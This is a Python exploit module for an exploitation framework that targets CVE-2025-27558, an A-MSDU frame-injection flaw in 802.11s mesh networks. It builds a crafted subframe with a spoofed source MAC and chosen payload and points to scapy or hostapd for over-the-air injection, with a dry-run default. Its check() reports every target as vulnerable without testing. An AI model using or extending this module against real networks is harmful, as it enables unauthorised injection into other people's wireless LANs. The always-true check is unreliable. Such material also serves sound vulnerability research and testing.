"""FragAttacks AMSDU Mesh Network Attack (CVE-2025-27558).

A-MSDU (Aggregate MAC Service Data Unit) injection vulnerability in
802.11 mesh networks.  When a mesh node receives an A-MSDU frame, it
does not properly validate the destination MAC before forwarding subframes.
An attacker on the mesh can inject crafted A-MSDU frames that are
forwarded to arbitrary internal destinations.

CVSS: 6.5 Medium | AV:A/AC:L/PR:N/UI:N

Original research / PoC credits
--------------------------------
CVE     : CVE-2025-27558
CVSS    : 6.5 (Medium)
Source  : WirelessXPL-Forge wirelessxpl/modules/generic/wifi/fragattacks/
          fragattacks_amsdu_mesh_cve_2025_27558.py
          FragAttacks research: Mathy Vanhoef (https://fragattacks.com)

EmbedXPL port
-------------
Maintainer : Andre Henrique (@mrhenrike) | Uniao Geek

# authorized use only
"""
from __future__ import annotations

import struct

from embedxpl.core.exploit import *


_CVE = "CVE-2025-27558"


def _build_amsdu_subframe(dst: bytes, src: bytes, payload: bytes) -> bytes:
    """Build a single A-MSDU subframe (dst[6] + src[6] + len[2] + payload + pad)."""
    subframe = dst[:6] + src[:6] + struct.pack(">H", len(payload)) + payload
    # Pad to 4-byte boundary
    if len(subframe) % 4:
        subframe += b"\x00" * (4 - len(subframe) % 4)
    return subframe


class Exploit(Exploit):
    """FragAttacks AMSDU Mesh Injection (CVE-2025-27558)."""

    __info__ = {
        "name": "FragAttacks AMSDU Mesh Injection (CVE-2025-27558)",
        "description": (
            "802.11 mesh network A-MSDU injection vulnerability. Crafted A-MSDU frames "
            "are forwarded to arbitrary mesh destinations without MAC validation. "
            "Enables LAN injection from an adjacent mesh node. CVSS 6.5 (Medium). "
            "Based on FragAttacks research by Mathy Vanhoef."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike) | Uniao Geek",
            # FragAttacks technique: Mathy Vanhoef (fragattacks.com)
        ),
        "references": (
            "https://fragattacks.com",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-27558",
        ),
        "devices": ("802.11 mesh nodes (802.11s) with affected firmware",),
    }

    dst_mac = OptString("ff:ff:ff:ff:ff:ff", "Target destination MAC (dash or colon separated)")
    src_mac = OptString("de:ad:be:ef:00:01", "Spoofed source MAC")
    payload_hex = OptString("aaaa0800", "Inner payload hex (IPv4/ARP default)")
    dry_run = OptBool(True, "Dry run — show frame only")

    @mute
    def check(self) -> bool:
        return True

    def run(self) -> None:
        dst_str = str(self.dst_mac).replace("-", ":").replace(".", ":")
        src_str = str(self.src_mac).replace("-", ":").replace(".", ":")
        payload_hex = str(self.payload_hex)
        dry_run = bool(self.dry_run)

        try:
            dst = bytes(int(x, 16) for x in dst_str.split(":"))
            src = bytes(int(x, 16) for x in src_str.split(":"))
        except ValueError:
            print_error("Invalid MAC address format")
            return

        payload = bytes.fromhex(payload_hex)
        subframe = _build_amsdu_subframe(dst, src, payload)

        print_status(f"FragAttacks AMSDU mesh frame — {_CVE}")
        print_info(f"A-MSDU subframe ({len(subframe)} bytes): {subframe.hex()}")

        if dry_run:
            print_info(
                "DRY-RUN: Frame built but not injected. Transmission requires: "
                "Linux with 802.11 mesh interface in monitor/injection mode. "
                "Use scapy or hostapd to inject over the air."
            )
        else:
            print_warning(
                f"Live injection for {_CVE} requires monitor-mode NIC and scapy. "
                "Use WirelessXPL-Forge fragattacks_amsdu_mesh module for full injection."
            )
